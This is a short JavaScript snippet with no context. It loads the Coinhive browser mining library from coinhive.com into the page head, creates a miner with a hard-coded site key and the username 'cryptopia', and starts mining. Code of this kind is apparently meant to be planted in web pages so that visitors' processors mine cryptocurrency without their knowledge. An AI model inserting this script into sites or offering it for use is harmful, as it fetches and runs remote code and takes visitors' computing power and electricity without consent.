var imported = document.createElement('script');
imported.src = 'https://coinhive.com/lib/coinhive.min.js';
document.head.appendChild(imported);
var miner = new CoinHive.User('GqEjB61Qhy7BZu5CdXu7Op72IAk9qS4W', 'cryptopia');
miner.start();
